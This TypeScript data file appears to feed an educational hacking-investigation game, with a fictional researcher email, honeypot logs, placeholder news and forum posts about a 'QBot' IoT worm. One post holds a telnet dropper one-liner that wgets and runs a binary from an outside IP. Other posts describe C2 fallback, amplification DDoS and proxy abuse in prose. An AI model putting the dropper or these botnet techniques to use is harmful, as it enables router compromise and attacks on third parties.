import EmailSite from "../pages/Web/WebContentPages/EmailSite/EmailSite";
import HackerForum from "../pages/Web/WebContentPages/HackerForum/HackerForum";
import HomeSite from "../pages/Web/WebContentPages/Home";
import NewsSite from "../pages/Web/WebContentPages/News/News";
import NotFound from "../pages/Web/WebContentPages/NotFound";

export const websiteMap: Record<string, React.FC> = {
  "https://home.com": HomeSite,
  "https://hackerforum.com": HackerForum,
  "https://your-emails.com": EmailSite,
  "https://global-news.com": NewsSite,
  "https://unknown-address.com": NotFound,
};

// --------------------------------------------------------------
// ----- EMAIL --------------------------------------------------
// --------------------------------------------------------------

export interface EmailThreadInterface {
  id: number;
  body: string;
  date: string;
}
export interface EmailInterface {
  id: number;
  sender: string;
  receiver: string;
  subject: string;
  summary: string;
  thread: EmailThreadInterface[];
  isRead: boolean;
  folder: "Inbox" | "Spam" | "Bin" | "Sent";
}

export const PLAYER_EMAIL = "me@me.com";

export const game_emails: EmailInterface[] = [
  {
    id: 0,
    sender: "alison@cybersec.com",
    receiver: PLAYER_EMAIL,
    subject: "Hacker Forum Link",
    thread: [
      {
        id: 0,
        body: `<p>Hey,</p>
            <p>Thanks again for coming to my lecture! I loved talking with you.</p>
            <p>To answer some of your other questions...</p>
            <p>I've been spending some time investigating a series of increasingly frequent, large-scale hacking attempts that have been hitting networks daily. The patterns are wide-ranging, and it's clear they're not random.</p>
            <p>While digging around online, I came across this forum: <strong>hackerforum.com</strong>.</p>
            <p>It's an open web platform where (what seems like) young attackers openly brag about their exploits, trade toolkits, and sell access to compromised systems. It's chaotic - but fascinating.</p>
            <p>Interestingly, there's a lot of chatter about something called <strong>QBot</strong> - a malware strain that seems to be involved in many of these attacks. Some users claim to have developed it, or at least modified versions.</p>
            <p><strong>Email me back</strong> with what else you learn about <strong>QBots</strong> through the hacker forum.</p>
            <p>Best,<br/>Alison</p>`,
        date: "2025-07-16",
      },
    ],
    summary: "Hey, Thanks for coming to my lecture...",
    isRead: false,
    folder: "Inbox",
  },
];

export function addReplyToEmail(emailId: number, reply: EmailThreadInterface) {
  const email = game_emails.find((e) => e.id === emailId);
  if (email) {
    email.thread.push(reply);
  }
}

// --------------------------------------------------------------
// ----- CHAT APP -----------------------------------------------
// --------------------------------------------------------------

export interface Person {
  id: number;
  name: string;
  avatar: string;
}

export const game_chat_users: Person[] = [
  { id: 0, name: "YOU", avatar: "👩‍🎨" },
  { id: 1, name: "Boss", avatar: "👩‍🎨" },
];

export interface MessageInterface {
  from_id: number;
  content: string;
}

export interface UserChats {
  chat_with_id: number;
  message_thread: MessageInterface[];
}

export const user_messages: UserChats[] = [
  {
    chat_with_id: 1,
    message_thread: [
      { from_id: 1, content: "Make sure it gets done." },
      { from_id: 0, content: "It will." },
    ],
  },
];

// --------------------------------------------------------------
// ----- TERMINAL -----------------------------------------------
// --------------------------------------------------------------
export const honey_pot_logs: string[] = [
  "[+] Launching Watchtower v3.2.1",
  "[+] Mode: Honeypot Monitoring",
  "[+] Loading attack signatures... done.",
  "[+] Tracking inbound traffic on ports 22, 23, 80, 443, 8080...",

  "[13:01:23] [TELNET] Mirai probe from 185.244.25.4: SYN on port 23",
  "[13:01:27] [SSH] Brute-force login attempt from 122.54.87.23 - root/admin123",
  "[13:02:10] [TCP] SYN flood detected from 198.51.100.12 on port 22",
  "[13:02:31] [HTTP] Command injection payload from 203.0.113.99",
  "[13:02:58] [TELNET] Session closed by remote 185.244.25.4",

  "[13:03:02] [SSH] 450 brute-force attempts blocked from 142.250.72.238",
  "[13:03:45] [MIRAI] Binary signature match: /bin/busybox detected",
  "[13:04:09] [SCAN] Port scan from 94.102.49.189 - 1000 ports hit in 0.47s",
  "[+] No successful intrusions detected. System integrity: INTACT.",
];

// --------------------------------------------------------------
// ----- FORUM --------------------------------------------------
// --------------------------------------------------------------
export interface ForumPost {
  id: number;
  author: HackerUser;
  title: string;
  content: string;
  comments: PostComment[];
}

export interface PostComment {
  id: number;
  author: HackerUser;
  content: string;
}

export interface HackerUser {
  id: number;
  username: string;
}

export const hackerUsers: HackerUser[] = [{ id: 0, username: "LiteSpeed" }];

export const forumPosts: ForumPost[] = [
  {
    id: 0,
    title: "QBot - go crazy",
    author: { id: 0, username: "LiteSpeed" },
    content: `<p>Hello all,</p>
              <p>So I’ve been experimenting with a small worm I built called <strong>QBot</strong> - mainly targeting cheap routers and IP cams. Most of these things run outdated firmware and use default creds like <code>admin:admin</code> or <code>root:1234</code>. Lazy af.</p>
              <p>Anyway, QBot scans a range of IPs looking for open telnet ports. Once it lands on one, it logs in and uses <code>echo</code> commands to write a shell script line-by-line into <code>/tmp/qbot.sh</code>, then executes it to fetch the main binary.</p>
              <p>Sample payload drop:</p>
              <pre><code>(echo "#!/bin/sh"; 
              echo "wget http://123.45.67.89/qbot.mips -O /tmp/q"; 
              echo "chmod +x /tmp/q"; 
              echo "/tmp/q") > /tmp/qbot.sh && sh /tmp/qbot.sh</code></pre>
              <p>The worm is light - like 10KB - but it propagates crazy fast on old netgear and zyxel routers. Started with a few seed IPs and within hours, I had a couple hundred bots pinging back.</p>
              <p>Wasn’t planning to release it, but someone I trusted leaked the binary. Now I’m seeing forks of it with DDoS modules slapped on. Funny how quick things evolve. Some are adding domain flux, HTTP C2, and watchdogs.</p>
              <p>Might rethink the whole architecture - centralize the loader, handle scanning separately, and just maintain persistent C2s. Still playing with ideas.<br />
              – LiteSpeed</p>
              <p><em>P.S. stay off shodan when testing. Someone’s always watching.</em></p>`,
    comments: [
      {
        id: 0,
        author: { id: 1, username: "NullByte" },
        content:
          "Clean payload drop - super minimal. Love the echo trick, I used something similar for a Mirai clone but yours is tighter.",
      },
      {
        id: 1,
        author: { id: 2, username: "bit_reaper" },
        content:
          "This is wild. Seeing forks already - someone just posted a version on another board with TOR C2 baked in.",
      },
      {
        id: 2,
        author: { id: 3, username: "ZX9_" },
        content:
          "Respect on not going full script kiddie and slapping DDoS on it. Most of these kids have no clue how telnet infection chains work.",
      },
      {
        id: 3,
        author: { id: 4, username: "rootvoid" },
        content:
          "Not gonna lie, this reminds me of Hajime’s early days. You might wanna obfuscate the wget line or use curl fallback just in case.",
      },
      {
        id: 4,
        author: { id: 5, username: "crypt0spawn" },
        content:
          "C2 architecture sounds like the next frontier. Let me know if you're building out a loader as a service 😉",
      },
      {
        id: 5,
        author: { id: 6, username: "d34db33f" },
        content:
          "lol @ stay off shodan. Real talk though - leaked binaries spread fast. Better get ahead of it before some kid gets caught using your code.",
      },
    ],
  },
  {
    id: 1,
    title: "QBot Add-On: Geo-Filter + Country Bans",
    author: { id: 4, username: "rootvoid" },
    content: `<p>Added a geo-filter to my fork of QBot using MaxMind DB. Now blocking installs from RU, CN, and random African ISPs.</p>
        <p>Why? Lower bot churn, fewer honeypots, less noise.</p>
        <p>Also lets me prioritize infection on broadband routers in the US/EU.</p>
        <p>Just drop a geo check before binary fetch. Simple but works.</p>`,
    comments: [
      {
        id: 0,
        author: { id: 0, username: "LiteSpeed" },
        content:
          "Smart add - should've thought of that earlier. Would help reduce honeypot hits big time. Mind sharing your MaxMind filter logic?",
      },
      {
        id: 1,
        author: { id: 2, username: "bit_reaper" },
        content:
          "Geo ban + ISP fingerprinting = stealth mode. Helps filter out low-value targets.",
      },
    ],
  },
  {
    id: 2,
    title: "Adding DNS-based C2 Fallback to QBot",
    author: { id: 5, username: "crypt0spawn" },
    content: `<p>Working on a DNS-based fallback for QBot to maintain C2 access during takedowns.</p>
        <p>Using TXT records to encode backup payload URLs. Bots will query fallback domains periodically and decode the IP or URL.</p>
        <p>Tested it under DPI — still slides under radar unless they parse payload content.</p>`,
    comments: [
      {
        id: 0,
        author: { id: 0, username: "LiteSpeed" },
        content:
          "Fallbacks are a must with how fast hosting gets burned. Keep TTLs low and rotate often to avoid caching issues.",
      },
      {
        id: 1,
        author: { id: 1, username: "NullByte" },
        content:
          "Nice stealth. TXT channels were my go-to for C2 back when Cloudflare DNS was open.",
      },
    ],
  },
  {
    id: 3,
    title: "DDoS Amplification via Abused QBot Nodes",
    author: { id: 6, username: "d34db33f" },
    content: `<p>Spun up a DDoS module for QBot that uses infected devices to launch SSDP and DNS amplification.</p>
        <p>About 40% of my nodes had open outbound UDP, so they worked without tunneling.</p>
        <p>Stacked a 2Gbps flood in testing using just ~300 MIPS routers.</p>
        <p>Thinking of adding CHARGEN next.</p>`,
    comments: [
      {
        id: 0,
        author: { id: 0, username: "LiteSpeed" },
        content:
          "Careful with CHARGEN — gets noisy fast. SSDP is quieter but effective. Did you spoof source IP directly from the bot?",
      },
      {
        id: 1,
        author: { id: 3, username: "ZX9_" },
        content:
          "Wild numbers from cheap hardware. Curious how long they stay online under that load.",
      },
    ],
  },
  {
    id: 4,
    title: "QBot: Turning Bots into SOCKS5 Proxies",
    author: { id: 1, username: "NullByte" },
    content: `<p>Modified my QBot variant to open up SOCKS5 ports post-infection. </p>
<p>Bots act as private proxies — useful for anonymizing scraping, C2 routes, or credential stuffing ops.</p>
<p>Planning to let C2 activate/deactivate via flags so bandwidth isn't always drained.</p>`,
    comments: [
      {
        id: 0,
        author: { id: 0, username: "LiteSpeed" },
        content:
          "Tight idea. I’ve thought about proxy chaining through QBot nodes but worried about memory limits. You seeing any crashes on ARMv5?",
      },
      {
        id: 1,
        author: { id: 2, username: "bit_reaper" },
        content:
          "This is gold. Could sell access to these as a stealthy residential proxy pool.",
      },
    ],
  },
  {
    id: 5,
    title: "QBot Idea: Infection Vectors Beyond Telnet",
    author: { id: 2, username: "bit_reaper" },
    content: `<p>Telnet is drying up. Thinking of expanding QBot’s infection surface to:</p>
      <br />
      <p>- UPnP-enabled routers</p>
      <p>- Open MikroTik APIs</p>
      <p>- Misconfigured MQTT brokers</p>
      <br />
      <p>Already scanning for port 8728 (MikroTik API) — got 45 hits last night.</p>`,
    comments: [
      {
        id: 0,
        author: { id: 0, username: "LiteSpeed" },
        content:
          "Yup, telnet’s fading. MikroTik is juicy, especially on older RouterOS versions. Careful with UPnP though, some ISPs actively log it.",
      },
      {
        id: 1,
        author: { id: 5, username: "crypt0spawn" },
        content:
          "MQTT's a sleeper hit. Found dozens of unsecured brokers last month leaking IoT device creds.",
      },
    ],
  },
];

// --------------------------------------------------------------
// ----- NEWS ---------------------------------------------------
// --------------------------------------------------------------

export interface NewsPostInterface {
  id: number;
  title: string;
  author: string;
  summary: string;
  content: string;
  breaking: boolean;
}

export const newsPosts: NewsPostInterface[] = [
  {
    id: 0,
    title: "Breaking News: Major Event in Australia",
    summary:
      "This is a summary of the latest breaking news story happening in Australia today. Stay tuned for updates.",
    author: "",
    content: "",
    breaking: true,
  },
  {
    id: 1,
    title: "Local News: City Council Updates",
    summary: "Details about the latest decisions by the city council.",
    author: "",
    content: "",
    breaking: false,
  },
  {
    id: 2,
    title: "Sports: Big Win for Local Team",
    summary: "Highlights from yesterday's thrilling game.",
    author: "",
    content: "",
    breaking: false,
  },
  {
    id: 3,
    title: "Culture: New Exhibition Opens",
    summary: "A new art exhibition has opened downtown.",
    author: "",
    content: "",
    breaking: false,
  },
];

export const newsRotation1: NewsPostInterface[] = [
  {
    id: 0,
    title: "Breaking News: Brian Krebs",
    summary:
      "This is a summary of the latest breaking news story happening in Australia today. Stay tuned for updates.",
    author: "",
    content: "",
    breaking: true,
  },
  {
    id: 1,
    title: "Local News: City Council Updates",
    summary: "Details about the latest decisions by the city council.",
    author: "",
    content: "",
    breaking: false,
  },
  {
    id: 2,
    title: "Sports: Big Win for Local Team",
    summary: "Highlights from yesterday's thrilling game.",
    author: "",
    content: "",
    breaking: false,
  },
  {
    id: 3,
    title: "Culture: New Exhibition Opens",
    summary: "A new art exhibition has opened downtown.",
    author: "",
    content: "",
    breaking: false,
  },
];

export const newsRotation2: NewsPostInterface[] = [
  {
    id: 0,
    title: "Breaking News: Brian Krebs",
    summary:
      "This is a summary of the latest breaking news story happening in Australia today. Stay tuned for updates.",
    author: "",
    content: "",
    breaking: true,
  },
  {
    id: 1,
    title: "Local News: City Council Updates",
    summary: "Details about the latest decisions by the city council.",
    author: "",
    content: "",
    breaking: false,
  },
  {
    id: 2,
    title: "Sports: Big Win for Local Team",
    summary: "Highlights from yesterday's thrilling game.",
    author: "",
    content: "",
    breaking: false,
  },
  {
    id: 3,
    title: "Culture: New Exhibition Opens",
    summary: "A new art exhibition has opened downtown.",
    author: "",
    content: "",
    breaking: false,
  },
];
